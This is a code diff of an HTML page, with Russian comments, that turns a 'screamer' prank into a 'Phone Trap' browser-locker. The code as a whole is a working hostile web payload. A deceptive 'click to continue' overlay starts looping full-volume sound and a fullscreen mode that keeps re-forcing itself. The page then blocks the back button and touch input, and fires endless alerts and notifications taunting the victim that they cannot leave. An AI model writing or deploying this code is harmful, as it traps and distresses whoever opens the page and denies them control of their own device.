@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Screamer Effect</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
+    <title>Phone Trap</title>
     <style>
         body {
             margin: 0;
             height: 100vh;
             background-color: #000;
+            overflow: hidden;
         }
 
         canvas {
@@ -26,9 +26,16 @@
             left: 0;
             width: 100vw;
             height: 100vh;
-            background-color: #f5f6fa;
+            background-color: #f00;
             z-index: 2;
             cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            font-size: 24px;
+            font-family: Arial, sans-serif;
+            text-align: center;
         }
 
         .overlay.hidden {
@@ -38,10 +45,35 @@
         audio {
             display: none;
         }
+
+        .no-interaction {
+            pointer-events: none;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+        }
+
+        .noise {
+            position: fixed;
+            width: 100px;
+            height: 100px;
+            background-color: rgba(255, 0, 0, 0.8);
+            z-index: 3;
+            animation: move 1s infinite;
+        }
+
+        @keyframes move {
+            0% { transform: translate(0, 0); }
+            25% { transform: translate(50vw, 50vh); }
+            50% { transform: translate(-50vw, -50vh); }
+            75% { transform: translate(20vw, -20vh); }
+            100% { transform: translate(0, 0); }
+        }
     </style>
 </head>
 <body>
-    <div id="overlay" class="overlay" onclick="startScreamer()"></div>
+    <div id="overlay" class="overlay" onclick="startVirus()">Нажми, чтобы продолжить</div>
     <canvas id="screamerCanvas"></canvas>
     <audio id="sound" src="sound.mp3" preload="auto" loop></audio>
     <script>
@@ -50,12 +82,17 @@
         const sound = document.getElementById('sound');
         let hasClicked = false;
 
-        // Устанавливаем onbeforeunload сразу
-        window.onbeforeunload = function() {
-            if (hasClicked) {
-                return "Вы уверены, что хотите уйти?";
-            }
-        };
+        // Проверка, является ли устройство ПК
+        const isPC = !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+        // Устанавливаем onbeforeunload для ПК сразу
+        if (isPC) {
+            window.onbeforeunload = function() {
+                if (hasClicked) {
+                    return "Ты уверен, что хочешь закрыть сайт?";
+                }
+            };
+        }
 
         // Загружаем изображение
         const img1 = new Image();
@@ -66,53 +103,95 @@
             canvas.height = img1.height;
             ctx.drawImage(img1, 0, 0, canvas.width, canvas.height);
         };
+        img1.onerror = () => {
+            // Если изображение не загрузилось, всё равно продолжаем
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            ctx.fillStyle = "#000";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+        };
 
-        function startScreamer() {
-            hasClicked = true;
+        function enterFullscreen() {
+            const { documentElement } = document;
+            if (documentElement.requestFullscreen) {
+                documentElement.requestFullscreen();
+            } else if (documentElement.webkitRequestFullscreen) {
+                documentElement.webkitRequestFullscreen();
+            }
+        }
+
+        function startVirus() {
+            hasClicked = true; // Устанавливаем сразу
             const overlay = document.getElementById('overlay');
             overlay.classList.add('hidden');
 
             // Запуск звука
             sound.volume = 1.0;
             sound.loop = true;
-            sound.play();
+            sound.play().catch(() => {
+                // Если звук не загрузился, продолжаем
+            });
             sound.onpause = () => sound.play();
 
             // Полноэкранный режим
-            const { documentElement } = document;
-            if (documentElement.requestFullscreen) {
-                documentElement.requestFullscreen();
-            } else if (documentElement.mozRequestFullScreen) {
-                documentElement.mozRequestFullScreen();
-            } else if (documentElement.webkitRequestFullscreen) {
-                documentElement.webkitRequestFullscreen();
-            } else if (documentElement.msRequestFullscreen) {
-                documentElement.msRequestFullscreen();
-            }
+            enterFullscreen();
 
-            // Усложняем закрытие
+            // Усложняем выход
             trapUser();
+
+            // Блокируем взаимодействие
+            document.body.classList.add('no-interaction');
+
+            // Добавляем хаотичные элементы
+            spawnNoise();
         }
 
         function trapUser() {
-            // Блокировка клавиш
-            window.addEventListener('keydown', e => {
-                if (e.key === 'Escape' || e.key === ' ' || (e.ctrlKey && e.key === 'w') || 
-                    (e.altKey && e.key === 'F4')) {
-                    e.preventDefault();
-                }
+            // Блокировка касаний
+            document.addEventListener('touchstart', e => {
+                if (hasClicked) e.preventDefault();
+            });
+            document.addEventListener('touchmove', e => {
+                if (hasClicked) e.preventDefault();
             });
 
-            // Блокировка правого клика
-            document.addEventListener('contextmenu', e => {
-                e.preventDefault();
-            });
-
-            // Зацикливание истории
+            // Блокировка кнопки "назад"
             history.pushState(null, null, location.href);
             window.addEventListener('popstate', () => {
                 history.pushState(null, null, location.href);
             });
+
+            // Постоянная проверка fullscreen
+            setInterval(() => {
+                if (!document.fullscreenElement && hasClicked) {
+                    enterFullscreen();
+                }
+            }, 100);
+
+            // Бесконечные уведомления (если разрешены)
+            if (Notification.permission === "granted") {
+                setInterval(() => new Notification("Ты не уйдёшь!"), 1000);
+            } else if (Notification.permission !== "denied") {
+                Notification.requestPermission().then(permission => {
+                    if (permission === "granted") {
+                        setInterval(() => new Notification("Ты не уйдёшь!"), 1000);
+                    }
+                });
+            }
+
+            // Бесконечные alert для максимального раздражения
+            setInterval(() => alert("Ты застрял!"), 2000);
+        }
+
+        function spawnNoise() {
+            setInterval(() => {
+                const noise = document.createElement('div');
+                noise.className = 'noise';
+                noise.style.left = Math.random() * 90 + 'vw';
+                noise.style.top = Math.random() * 90 + 'vh';
+                document.body.appendChild(noise);
+                setTimeout(() => noise.remove(), 2000);
+            }, 500);
         }
     </script>
 </body>
